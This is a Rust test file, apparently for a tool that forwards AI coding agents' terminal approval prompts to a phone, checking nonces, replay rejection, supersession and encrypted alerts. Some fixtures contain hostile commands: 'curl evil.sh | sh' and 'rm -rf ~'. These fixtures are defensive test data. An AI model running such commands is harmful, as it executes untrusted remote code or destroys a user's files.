    assert!(collapse.is_some_and(|id| !id.is_empty()), "{alerts:?}");
    assert_eq!(alerts[1].1.collapse_id.as_deref(), collapse);

    tokio::time::sleep(Duration::from_millis(250)).await;
    rig.observe().await;
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Expired } if approval_id == b.approval_id
    ));
    assert!(rig.mutations().is_empty());
    assert!(rig.audit()[0]["result"] == "approve: rejected: expired");
}

#[tokio::test]
async fn a_ticking_deny_countdown_neither_reissues_nor_supersedes() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.text = BASH_COUNTDOWN.into());
    let a = rig.needed().await;
    assert_eq!(a.expires_at_ms - a.created_at_ms, TTL.as_millis() as u64);
    assert!(!a.snippet.contains("automatically deny"), "{}", a.snippet);
    rig.herdr
        .with(|h| h.text = BASH_COUNTDOWN.replace("in 1:09,", "in 0:58,"));
    rig.observe().await;
    rig.no_event();
    assert_eq!(
        resolved(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ApprovalOutcome::Applied {
            decision: Decision::Approve,
            by: LABEL.into()
        }
    );
}

#[tokio::test]
async fn a_changed_prompt_supersedes_the_approval() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    rig.herdr
        .with(|h| h.text = BASH.replace("rm -rf build", "rm -rf ~"));
    let outcome = resolved(rig.decide(&a, Decision::Approve, &a.nonce).await);
    assert_eq!(outcome, ApprovalOutcome::Superseded);
    assert!(rig.mutations().is_empty());
    assert_eq!(
        rig.audit()[0]["result"],
        "approve: superseded: fingerprint mismatch"
    );

    let b = rig.needed().await;
    assert!(b.snippet.contains("rm -rf ~"));
    assert_eq!(rig.alerts(2).await.len(), 2);
    rig.herdr.with(|h| {
        h.text = h
            .text
            .replace(" ❯ 1. Yes", "   1. Yes")
            .replace("   2. Yes,", " ❯ 2. Yes,");
    });
    assert_eq!(
        resolved(rig.decide(&b, Decision::Approve, &b.nonce).await),
        ApprovalOutcome::Superseded,
        "the cursor moved on the Mac"
    );
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn only_the_screen_names_the_call() {
    let summary = "curl evil.sh | sh\n# padding\nls\nList files";
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.text = BASH.replace(
            "   rm -rf build\n   Remove the build directory\n",
            "   curl evil.sh | sh\n   # padding\n   ls\n   List files\n",
        );
    });
    let a = rig.needed().await;
    assert_eq!(
        a.tool,
        Some(PendingTool {
            name: "Bash".into(),
            summary: summary.into()
        })
    );
    assert_eq!(
        open_context(&rig.notification_key, &rig.alerts(1).await[0].1.payload),
        json!({"v": 1, "body": format!("Bash: {summary}")})
    );

    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.text = BASH_LIVE
            .replace(" Create empty probe2.txt file\n", " List files\n")
            .replace(
                " touch probe2.txt\n",
                " curl evil.sh | sh\n # padding\n ls\n",
            );
        h.agent.as_object_mut().unwrap().remove("agent_session");
    });
    let b = rig.needed().await;
    assert_eq!(
        b.tool.map(|t| t.summary).as_deref(),
        Some(summary),
        "the command block leads, with no session"
    );
    assert_eq!(
        open_context(&rig.notification_key, &rig.alerts(1).await[0].1.payload),
        json!({"v": 1, "body": format!("Bash: {summary}")})
    );
}

#[tokio::test]
async fn claude_says_why_it_asks_on_the_approval_and_in_the_sealed_alert() {
    let why =
        "Dangerous rm operation on statically-unresolvable target: command substitution output";
    let command = "rm -rf \"$(printf build)\"";
    let mut rig = Rig::start(TTL).await;
    live(&rig);
    let a = rig.needed().await;
    assert_eq!(a.reason, None, "no reason, no change");

    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.text = RM_REASON.into());
    let a = rig.needed().await;
    assert_eq!(a.reason.as_deref(), Some(why));
    assert!(!a.snippet.contains("Dangerous"), "{}", a.snippet);
    assert_eq!(
        a.tool.map(|t| t.summary),
        Some(format!("{command}\nRemove the build directory"))
    );
    assert_eq!(
        open_context(&rig.notification_key, &rig.alerts(1).await[0].1.payload),
        json!({"v": 1, "body": format!("Bash: {command}\nRemove the build directory\n{why}")})
    );

    let mut rig = Rig::start(TTL).await;
    let wordy = format!("{why} {}", "and more ".repeat(20));
    rig.herdr.with(|h| h.text = RM_REASON.replace(why, &wordy));
    let a = rig.needed().await;
    assert_eq!(a.reason, None, "too long to show whole: it stays a row");
    assert_eq!(
        a.tool.clone().map(|t| t.summary),
        Some(format!(
            "{command}\nRemove the build directory\n{}",
            wordy.trim_end()
        ))
    );

    let mut rig = Rig::start(TTL).await;
    let long = format!("rm -rf \"$(printf {})\"", "b".repeat(700));
    rig.herdr
        .with(|h| h.text = RM_REASON.replace("rm -rf \"$(printf build)\"", &long));
    let a = rig.needed().await;
    assert_eq!(a.reason.as_deref(), Some(why));
    let body = open_context(&rig.notification_key, &rig.alerts(1).await[0].1.payload)["body"]
        .as_str()
        .unwrap()
        .to_owned();
    assert_eq!(body.chars().count(), collied::prompt::MAX_CONTEXT_CHARS);
    let context = body
        .strip_suffix(&format!("\n{why}"))
        .expect("a context at its cap never pushes the reason out");
    assert!(context.starts_with("Bash: rm -rf \"$(printf bbb") && context.ends_with('…'));
}

#[tokio::test]
async fn every_attempt_burns_the_nonce() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &wrong(&a.nonce)).await),
        ErrorCode::ApprovalNonceMismatch
    );
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::ApprovalAlreadyResolved
    );
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved {
            outcome: ApprovalOutcome::Superseded,
            ..
        }
    ));

    rig.herdr.with(|h| {
        h.text = BASH.replace(
            "   2. Yes, and don't ask again for rm commands in /Users/me/src/app\n   3. No",
            "   2. No",
        );
    });
    let b = rig.needed().await;
    assert_eq!(b.options, [Decision::Approve, Decision::Deny]);
    assert_eq!(
        code(rig.decide(&b, Decision::ApproveAlways, &b.nonce).await),
        ErrorCode::InvalidParams
    );
    assert_eq!(
        code(rig.decide(&b, Decision::Approve, &b.nonce).await),
        ErrorCode::ApprovalAlreadyResolved
    );

    let c = rig.needed().await;
    let revoked: Authorized = Arc::new(|| false);
    assert_eq!(
        code(
            rig.decide_as(&c, Decision::Approve, &c.nonce, revoked)
                .await
        ),
        ErrorCode::NotPaired
    );
    assert!(rig.mutations().is_empty());
    let results: Vec<Value> = rig.audit().iter().map(|e| e["result"].clone()).collect();
    assert_eq!(
        results,
        [
            "approve: rejected: bad nonce",
            "approve: rejected: replayed",
            "approve_always: rejected: decision not offered",
            "approve: rejected: replayed",
            "approve: rejected: peer no longer authorized",
        ]
    );
}

#[tokio::test]
async fn leaving_blocked_without_a_decision_supersedes() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    rig.herdr.set_status("working");
    rig.observe().await;
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Superseded } if approval_id == a.approval_id
    ));
    assert!(rig.approvals.pending().is_empty());
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::ApprovalAlreadyResolved
    );
}

#[tokio::test]
async fn the_pending_count_follows_every_approval() {
    let mut rig = Rig::start(TTL).await;
    let mut count = rig.approvals.watch_pending();
    assert_eq!(*count.borrow_and_update(), 0);
    let a = rig.needed().await;
    assert!(count.has_changed().unwrap());
    assert_eq!(*count.borrow_and_update(), 1);
    rig.observe().await;
    assert!(!count.has_changed().unwrap(), "no change, no update");
    resolved(rig.decide(&a, Decision::Approve, &a.nonce).await);
    assert_eq!(*count.borrow_and_update(), 0);

    rig.herdr.set_status("blocked");
    rig.needed().await;
    assert_eq!(*count.borrow_and_update(), 1);
    rig.herdr.set_status("working");
    rig.observe().await;
    assert_eq!(*count.borrow_and_update(), 0, "superseded");
}

#[tokio::test]
async fn arrows_are_seen_on_the_target_before_enter() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    let outcome = resolved(rig.decide(&a, Decision::ApproveAlways, &a.nonce).await);
    assert_eq!(
        outcome,
        ApprovalOutcome::Applied {
            decision: Decision::ApproveAlways,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
    assert_eq!(
        rig.audit()[0]["result"],
        format!("approve_always: applied terminal={TERMINAL} keys=down,enter")
    );
}

#[tokio::test]
async fn lost_arrows_never_confirm() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.arrows_move = false);
    let a = rig.needed().await;
    let outcome = resolved(rig.decide(&a, Decision::ApproveAlways, &a.nonce).await);
    assert_eq!(outcome, ApprovalOutcome::Superseded);
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["down"]})]
    );
    assert_eq!(
        rig.audit()[0]["result"],
        format!("approve_always: superseded: cursor not on target terminal={TERMINAL} keys=down")
    );
    assert_eq!(
        rig.herdr.with(|h| h.agent["agent_status"].clone()),
        "blocked"
    );
}

#[tokio::test]
async fn keys_without_effect_are_unconfirmed() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.unblock_on_keys = false);
    let a = rig.needed().await;
    let outcome = resolved(rig.decide(&a, Decision::Approve, &a.nonce).await);
    assert_eq!(
        outcome,
        ApprovalOutcome::Unconfirmed {
            decision: Decision::Approve,
            by: LABEL.into()
        }
    );
    assert_eq!(rig.herdr.params("agent.send_keys").len(), 1);
}

#[tokio::test]
async fn unknown_prompts_get_a_notification_without_actions() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.rule = "mcp_elicitation_prompt".into());
    let a = rig.needed().await;
    assert!(a.options.is_empty());
    assert!(a.snippet.contains("Do you want to proceed?"));
    let alerts = rig.alerts(1).await;
    assert!(alerts[0].1.payload["aps"].get("category").is_none());
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn a_dialog_taller_than_the_screen_is_answered_in_the_terminal() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.text = BASH_TALL.into());
    let a = rig.needed().await;
    assert!(a.options.is_empty() && a.choices.is_empty() && a.tool.is_none());
    let alerts = rig.alerts(1).await;
    assert!(alerts[0].1.payload["aps"].get("category").is_none());
    assert_eq!(
        open_context(&rig.notification_key, &alerts[0].1.payload)["body"],
        json!("Do you want to proceed?")
    );
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn a_form_taller_than_the_screen_is_answered_in_the_terminal() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = RATE_LIMIT.into();
    });
    let a = rig.needed().await;
    assert!(
        a.choices.len() == 2 && a.accepts_input,
        "whole under its border"
    );
    // Hand-built from the captures, not captured: each form from under its first rows, as a
    // terminal too short for it would show it.
    rig.transcript(&asking(ASKS_LIVE));
    let (_, rate_limit) = RATE_LIMIT.split_once("What do you want to do?\n").unwrap();
    let (_, question) = QUESTION_LIVE.split_once(" ☐ Cache Backend\n\n").unwrap();
    for tall in [rate_limit, question] {
        rig.herdr.with(|h| {
            h.text = tall.into();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        assert!(
            a.options.is_empty() && a.choices.is_empty() && !a.accepts_input && !a.has_text_field,
            "{tall}"
        );
        assert_eq!(
            code(rig.choose(&a, 0, &a.nonce).await),
            ErrorCode::InvalidParams
        );
    }
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn a_numbered_form_that_reads_as_no_menu_takes_no_keys() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.rule = "live_blocked_form".into());
    rig.transcript(&asking(ASKS_LIVE));
    // Hand-built from the captures, not captured: the question and the rate limit form from
    // under their option 1, as a terminal too short for them would show them, and the question
    // with four rows under its option 1, one more than a menu reads.
    let (_, question) = QUESTION_LIVE.split_once("local persistence\n").unwrap();
    let (_, rate_limit) = RATE_LIMIT.split_once("limit to reset\n").unwrap();
    let long = QUESTION_LIVE.replace(
        "     File-based database",
        "     Embedded\n     One file\n     No server\n     File-based database",
    );
    // And the cut question with a row of rule characters under its last option, as that
    // option's own text can draw one.
    let ruled = question.replace("Chat about this\n", "Chat about this\n     ──────\n");
    assert_ne!(ruled, question);
    for form in [question, rate_limit, &long, &ruled] {
        rig.herdr.with(|h| {
            h.text = form.into();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        assert!(
            a.options.is_empty() && a.choices.is_empty() && !a.accepts_input && !a.has_text_field,
            "{form}"
        );
        assert_eq!(
            code(rig.choose(&a, 0, &a.nonce).await),
            ErrorCode::InvalidParams
        );
    }
    // The 2.1.294 captures of the forms without numbers, and `/ide` under a numbered list
    // (hand-added to the capture's transcript rows): each takes keys as before.
    let listed = IDE.replacen("❯ /add-dir\n", "  1. First\n  2. Second\n", 1);
    assert_ne!(listed, IDE);
    for form in [MEMORY, IDE, USAGE_CREDITS, &listed] {
        rig.herdr.with(|h| {
            h.text = form.into();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        assert!(
            a.choices.is_empty() && a.accepts_input && !a.has_text_field,
            "{form}"
        );
    }
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn codex_attention_preview_excludes_user_input_for_direct_and_relay_delivery() {
    for relay in [false, true] {
        for (text, expected) in [
            (
                include_str!("fixtures/codex/attention-preview.detection.txt"),
                "Storage is healthy. Review the results above.",
            ),
            (
                include_str!("fixtures/codex/question-0.162.1.detection.txt"),
                "Which preview should the demo display?",
            ),
            (
                "  Question 1/2 (2 unanswered)\n  Old preview question?\n\n  › 1. Blue\n    2. Green\n\n  Question 2/2 (1 unanswered)\n  Current question still rendering?\n\n  tab to add notes | enter to submit answer | esc to interrupt\n",
                "Blocked in api",
            ),
            (
                "› Is storage healthy?\n  including cached files\n",
                "Blocked in api",
            ),
        ] {
            let mut rig = Rig::start_with_delivery(TTL, None, relay).await;
            rig.herdr.with(|h| {
                h.agent["agent"] = json!("codex");
                h.rule = "osc_title_blocked".into();
                h.text = text.into();
            });
            let approval = rig.needed().await;
            assert!(approval.options.is_empty() && approval.choices.is_empty());
            let alerts = rig.alerts(1).await;
            let alert = &alerts[0].1;
            let display = open_display(&rig.notification_key, &alert.payload, 1);
            assert_eq!(display["body"], expected);
            assert_eq!(display["offersApproval"], false);
            assert_eq!(display["terminalId"], approval.terminal_id.as_str());
            assert_eq!(display["approvalId"], approval.approval_id.as_str());
            assert_eq!(
                alert.payload["aps"]["alert"],
                json!({"title":"Collie","body":"An agent needs attention"})
            );
            let wire = alert.payload.to_string();
            assert!(
                !wire.contains("storage") && !wire.contains("Storage") && !wire.contains("preview")
            );
            assert!(rig.mutations().is_empty());
        }
    }
}

#[tokio::test]
async fn codex_and_copilot_prompts_are_answered_in_the_terminal() {
    for (kind, rule, text) in OTHER_KINDS {
        let mut rig = Rig::start(TTL).await;
        rig.follow();
        rig.herdr.with(|h| {
            h.agent["agent"] = json!(kind);
            h.agent["agent_session"] = json!({"source": format!("herdr:{kind}"), "agent": kind, "kind": "id", "value": "sess-1"});
            h.rule = rule.into();
            h.text = text.into();
        });
        let a = rig.ticked_needed().await;
        assert!(
            a.options.is_empty() && a.choices.is_empty() && a.tool.is_none(),
            "{kind} {rule}"
        );
        assert!(!a.accepts_input && !a.has_text_field && !a.supports_note);
        let sent = rig.sent().await;
        let alerts = alerting(&sent);
        assert_eq!(alerts.len(), 1, "{sent:?}");
        assert_eq!(alerts[0].0, token().as_str(), "not on the activity");
        assert_eq!(alerts[0].1.delivery, Delivery::Alert);
        assert!(alerts[0].1.payload["aps"].get("category").is_none());
        assert!(sent.iter().all(|(_, s)| {
            !matches!(s.delivery, Delivery::LiveActivity { .. })
                || open_display(&rig.notification_key, &s.payload, 2)["state"]
                    .get("approvalId")
                    .is_none()
        }));

        assert_eq!(
            code(rig.decide(&a, Decision::Approve, &a.nonce).await),
            ErrorCode::InvalidParams
        );
        let b = rig.ticked_needed().await;
        assert_eq!(
            code(rig.decide(&b, Decision::Deny, &b.nonce).await),
            ErrorCode::InvalidParams
        );
        let c = rig.ticked_needed().await;
        assert_eq!(
            code(rig.choose(&c, 0, &c.nonce).await),
            ErrorCode::InvalidParams
        );
        assert!(rig.mutations().is_empty(), "{kind} {rule}");
    }
}

#[tokio::test]
async fn a_new_codex_prompt_under_a_still_blocked_agent_supersedes_the_old_one() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.agent["agent"] = json!("codex");
        h.rule = OTHER_KINDS[0].1.into();
        h.text = OTHER_KINDS[0].2.into();
    });
    let a = rig.needed().await;
    assert!(a.snippet.contains("cargo test"), "{}", a.snippet);
    rig.observe().await;
    rig.no_event();

    rig.herdr.with(|h| h.text = OTHER_KINDS[1].2.into());
    rig.observe().await;
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Superseded }
            if approval_id == a.approval_id
    ));
    let Event::ApprovalNeeded { approval: b } = rig.event().await else {
        panic!("expected approval.needed");
    };
    assert!(!b.snippet.contains("cargo test"), "{}", b.snippet);
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn decide_attempts_are_rate_limited() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    let mut codes = Vec::new();
    for _ in 0..6 {
        codes.push(code(rig.decide(&a, Decision::Deny, &wrong(&a.nonce)).await));
    }
    assert_eq!(codes[0], ErrorCode::ApprovalNonceMismatch);
    assert_eq!(codes[5], ErrorCode::RateLimited);
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn enter_is_never_sent_once_the_budget_has_passed() {
    let budget = Duration::from_millis(500);
    let mut rig = Rig::start_with_budget(TTL, Some(budget)).await;
    let a = rig.needed().await;
    let checks = Arc::new(AtomicUsize::new(0));
    let seen = checks.clone();
    // The second check runs once the cursor is seen on the target, just before Enter.
    let slow: Authorized = Arc::new(move || {
        if seen.fetch_add(1, Ordering::SeqCst) == 1 {
            std::thread::sleep(budget + Duration::from_millis(100));
        }
        true
    });
    let outcome = resolved(
        rig.decide_as(&a, Decision::ApproveAlways, &a.nonce, slow)
            .await,
    );
    assert_eq!(outcome, ApprovalOutcome::Superseded);
    assert_eq!(checks.load(Ordering::SeqCst), 2);
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [json!({"target": "w7:p1", "keys": ["down"]})]
    );
    assert_eq!(
        rig.audit()[0]["result"],
        format!("approve_always: superseded: herdr too slow terminal={TERMINAL} keys=down")
    );
}

#[tokio::test]
async fn reissues_cannot_flood_the_phone() {
    let mut rig = Rig::start(TTL).await;
    let mut a = rig.needed().await;
    for _ in 0..3 {
        assert_eq!(
            code(rig.decide(&a, Decision::Deny, &wrong(&a.nonce)).await),
            ErrorCode::ApprovalNonceMismatch
        );
        let b = rig.needed().await;
        assert_ne!(b.approval_id, a.approval_id, "sessions get every reissue");
        a = b;
    }
    assert_eq!(
        rig.alerts(2).await.len(),
        1,
        "the same prompt reissued within 30 s does not alert again"
    );
    assert_eq!(rig.approvals.pending(), std::slice::from_ref(&a));

    rig.herdr.set_status("blocked");
    let b = rig.needed().await;
    let alerts = rig.alerts(2).await;
    assert_eq!(alerts.len(), 2, "a new prompt always alerts");
    assert_eq!(alerts[1].1.payload["approval_id"], b.approval_id.as_str());
    assert!(rig.mutations().is_empty());
}

fn clears(sent: &[(String, Alert)]) -> Vec<(String, Alert)> {
    sent.iter()
        .filter(|(_, a)| a.delivery == Delivery::Background)
        .cloned()
        .collect()
}

#[tokio::test]
async fn an_alert_is_cleared_once_the_agent_moves_on() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    rig.observe().await;
    assert!(clears(&rig.sent().await).is_empty(), "still blocked");

    rig.herdr.set_status("working");
    rig.observe().await;
    rig.observe().await;
    let sent = rig.sent().await;
    let cleared = clears(&sent);
    assert_eq!(cleared.len(), 1, "{sent:?}");
    let (to, clear) = &cleared[0];
    assert_eq!(to, token().as_str());
    assert_eq!(
        clear.payload,
        json!({
            "aps": {"content-available": 1},
            "approval_id": a.approval_id.as_str(),
            "node_id": "nMAC",
        })
    );
    let headers = clear.headers("dev.rbstp.collie");
    assert_eq!(headers.push_type, PushType::Background);
    assert_eq!(headers.topic, "dev.rbstp.collie");
    assert_eq!(headers.priority, 5);
    assert_eq!(headers.expiration, Some(0));
    assert_eq!(headers.collapse_id, None);
    assert_eq!(sent.last(), cleared.last());
}

#[tokio::test]
async fn a_clear_names_only_the_alerted_approval() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    code(rig.decide(&a, Decision::Deny, &wrong(&a.nonce)).await);
    let b = rig.needed().await;
    assert_eq!(alerting(&rig.sent().await).len(), 1, "b is a quiet reissue");
    rig.herdr.set_status("working");
    rig.observe().await;
    let cleared = clears(&rig.sent().await);
    assert_eq!(cleared.len(), 1);
    assert_eq!(
        cleared[0].1.payload["approval_id"],
        a.approval_id.as_str(),
        "the phone still shows a's alert, never b's"
    );
    assert_ne!(a.approval_id, b.approval_id);

    // A decision from the phone clears too: the watch and the Live Activity decide
    // without removing the phone's alert.
    rig.herdr.set_status("blocked");
    let c = rig.needed().await;
    resolved(rig.decide(&c, Decision::Approve, &c.nonce).await);
    rig.observe().await;
    let cleared = clears(&rig.sent().await);
    assert_eq!(cleared.len(), 2);
    assert_eq!(cleared[1].1.payload["approval_id"], c.approval_id.as_str());

    let mut rig = Rig::start(Duration::from_millis(200)).await;
    rig.needed().await;
    tokio::time::sleep(Duration::from_millis(250)).await;
    rig.needed().await;
    let sent = rig.sent().await;
    assert_eq!(alerting(&sent).len(), 2);
    assert!(
        clears(&sent).is_empty(),
        "a fresh alert replaces an expired one"
    );
}

#[tokio::test]
async fn settings_pickers_raise_no_approval() {
    for text in [EFFORT, TIME_FORMAT, RENAMED_TIME_FORMAT] {
        let mut rig = Rig::start(TTL).await;
        rig.follow();
        rig.herdr.with(|h| {
            h.rule = "live_blocked_form".into();
            h.text = text.into();
        });
        rig.tick().await;
        rig.tick().await;
        rig.no_event();
        assert!(rig.approvals.pending().is_empty());
        assert!(!rig.approvals.has_pending(TERMINAL));
        let sent = rig.sent().await;
        assert!(alerting(&sent).is_empty(), "{sent:?}");
        assert!(sent.iter().all(|(_, s)| {
            open_display(&rig.notification_key, &s.payload, 2)["state"]["approvals"] == 0
        }));

        rig.herdr.set_status("idle");
        rig.tick().await;
        assert!(clears(&rig.sent().await).is_empty());
        assert!(rig.mutations().is_empty());
    }

    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = IDE.into();
    });
    rig.needed().await;
    assert_eq!(alerting(&rig.alerts(1).await).len(), 1);
}

fn alerting(sent: &[(String, Alert)]) -> Vec<(String, Alert)> {
    sent.iter()
        .filter(|(_, a)| a.payload["aps"].get("alert").is_some())
        .cloned()
        .collect()
}

/// The widget's side: `enc` from the content-state opened with the device key, AAD = approvalId.
fn open_offered(key: &NotificationKey, state: &Value) -> Value {
    open_context(
        key,
        &json!({"enc": state["enc"], "approval_id": state["approvalId"]}),
    )
}

#[tokio::test]
async fn notifications_and_live_activities_continue_without_app_events() {
    let mut rig = Rig::start(TTL).await;
    drop(rig.events.take());
    rig.push
        .register(
            OTHER,
            other_token(),
            ApnsEnvironment::Sandbox,
            rig.notification_key.clone(),
            false,
            None,
        )
        .unwrap();
    rig.follow();
    rig.tick().await;
    let approval = rig.approvals.pending().pop().unwrap();
    let sent = rig.alerts(2).await;
    assert_eq!(sent.len(), 2);
    let (_, live) = sent
        .iter()
        .find(|(to, _)| to == activity_token().as_str())
        .unwrap();
    assert_eq!(live.delivery, Delivery::LiveActivity { urgent: true });
    let state = &open_display(&rig.notification_key, &live.payload, 2)["state"];
    assert_eq!(state["status"], "blocked");
    assert_eq!(state["approvalId"], approval.approval_id.as_str());
    assert_eq!(open_offered(&rig.notification_key, state)["v"], 1);
    let (_, alert) = sent
        .iter()
        .find(|(to, _)| to == other_token().as_str())
        .unwrap();
    assert_eq!(alert.delivery, Delivery::Alert);
    assert_eq!(alert.payload["approval_id"], approval.approval_id.as_str());
    assert_eq!(open_context(&rig.notification_key, &alert.payload)["v"], 1);
    rig.tick().await;
    assert_eq!(rig.sent().await.len(), 2);

    assert!(matches!(
        resolved(
            rig.decide(&approval, Decision::Approve, &approval.nonce)
                .await
        ),
        ApprovalOutcome::Applied { .. }
    ));
    rig.tick().await;
    assert!(rig.approvals.pending().is_empty());
    let sent = rig.sent().await;
    assert!(
        clears(&sent)
            .iter()
            .any(|(_, alert)| { alert.payload["approval_id"] == approval.approval_id.as_str() })
    );
    let (_, live) = sent
        .iter()
        .rev()
        .find(|(to, _)| to == activity_token().as_str())
        .unwrap();
    let state = &open_display(&rig.notification_key, &live.payload, 2)["state"];
    assert_eq!(state["status"], "working");
    assert!(state.get("approvalId").is_none() && state.get("enc").is_none());

    let mut turns = collied::turns::Turns::default();
    let agents = collied::runtime::herdr::agent_list(&rig.herdr.socket)
        .await
        .unwrap();
    assert!(turns.observe(&agents, 0).is_empty());
    rig.herdr.set_status("done");
    let agents = collied::runtime::herdr::agent_list(&rig.herdr.socket)
        .await
        .unwrap();
    let done = turns.observe(&agents, collied::turns::MIN_TURN_MS);
    assert_eq!(done.len(), 1);
    rig.push.notify_done(collied::push::done_alert(
        &TerminalId::new(done[0].terminal_id.clone()).unwrap(),
        "api-fixer",
        "api",
        "nMAC",
    ));
    tokio::time::sleep(collied::activity::MIN_GAP).await;
    rig.tick().await;
    let sent = rig.sent().await;
    let done: Vec<_> = sent
        .iter()
        .filter(|(_, alert)| {
            alert.delivery == Delivery::Alert
                && open_display(&rig.notification_key, &alert.payload, 1)["body"] == "Done in api"
        })
        .collect();
    assert_eq!(done.len(), 2);
    assert!(
        done.iter()
            .all(|(_, alert)| alert.delivery == Delivery::Alert)
    );
    let (_, live) = sent
        .iter()
        .rev()
        .find(|(to, _)| to == activity_token().as_str())
        .unwrap();
    assert_eq!(
        open_display(&rig.notification_key, &live.payload, 2)["state"]["status"],
        "done"
    );
}

#[tokio::test]
async fn a_followed_terminal_alerts_on_its_activity_only() {
    let mut rig = Rig::start(TTL).await;
    rig.push
        .register(
            OTHER,
            other_token(),
            ApnsEnvironment::Sandbox,
            rig.notification_key.clone(),
            false,
            None,
        )
        .unwrap();
    rig.push
        .register_activity(
            OTHER,
            ActivityId::new("ACT-2").unwrap(),
            TerminalId::new("term_elsewhere").unwrap(),
            PushToken::new("12".repeat(80)).unwrap(),
            true,
            Some(display_binding()),
            None,
        )
        .unwrap();
    rig.follow();
    let a = rig.ticked_needed().await;
    let sent = rig.sent().await;
    let alerts = alerting(&sent);
    assert_eq!(alerts.len(), 2, "{sent:?}");
    let (to, live) = alerts
        .iter()
        .find(|(_, a)| a.delivery == (Delivery::LiveActivity { urgent: true }))
        .unwrap();
    assert_eq!(to, activity_token().as_str());
    assert_eq!(live.headers("dev.rbstp.collie").priority, 10);
    let aps = &live.payload["aps"];
    assert_eq!(
        aps["alert"],
        json!({"title": "Collie", "body": "An agent needs attention"})
    );
    let state = &open_display(&rig.notification_key, &live.payload, 2)["state"];
    assert_eq!(state["status"], "blocked");
    assert_eq!(state["approvalId"], a.approval_id.as_str());
    assert_eq!(
        open_offered(&rig.notification_key, state),
        json!({"v": 1, "body": "Bash: rm -rf build\nRemove the build directory"})
    );
    let wire = live.payload.to_string();
    assert!(
        !wire.contains("rm -rf") && !wire.contains(a.nonce.as_str()),
        "{wire}"
    );
    let (to, regular) = alerts
        .iter()
        .find(|(_, a)| a.delivery == Delivery::Alert)
        .unwrap();
    assert_eq!(
        to,
        other_token().as_str(),
        "a device that does not follow it"
    );
    assert_eq!(regular.payload["approval_id"], a.approval_id.as_str());
    assert!(
        !sent.iter().any(|(t, _)| t == token().as_str()),
        "no approval notification for the follower"
    );

    for _ in 0..3 {
        rig.tick().await;
    }
    assert_eq!(
        alerting(&rig.sent().await).len(),
        2,
        "exactly one alert per approval"
    );

    assert_eq!(
        code(rig.decide(&a, Decision::Deny, &wrong(&a.nonce)).await),
        ErrorCode::ApprovalNonceMismatch
    );
    let b = rig.ticked_needed().await;
    let sent = rig.sent().await;
    assert_eq!(
        alerting(&sent).len(),
        2,
        "a reissue within 30 s stays quiet"
    );
    let (to, quiet) = sent.last().unwrap();
    assert_eq!(to, activity_token().as_str());
    assert_eq!(quiet.delivery, Delivery::LiveActivity { urgent: false });
    let state = &open_display(&rig.notification_key, &quiet.payload, 2)["state"];
    assert_eq!(state["approvalId"], b.approval_id.as_str());
    assert_eq!(open_offered(&rig.notification_key, state)["v"], 1);

    assert!(matches!(
        resolved(rig.decide(&b, Decision::Approve, &b.nonce).await),
        ApprovalOutcome::Applied { .. }
    ));
    tokio::time::sleep(collied::activity::MIN_GAP).await;
    rig.tick().await;
    let sent = rig.sent().await;
    let (to, cleared) = sent.last().unwrap();
    assert_eq!(to, activity_token().as_str());
    assert_eq!(
        cleared.delivery,
        Delivery::LiveActivity { urgent: true },
        "the update that drops the buttons goes at priority 10"
    );
    assert!(cleared.payload["aps"].get("alert").is_none());
    let state = &open_display(&rig.notification_key, &cleared.payload, 2)["state"];
    assert_eq!(state["status"], "working");
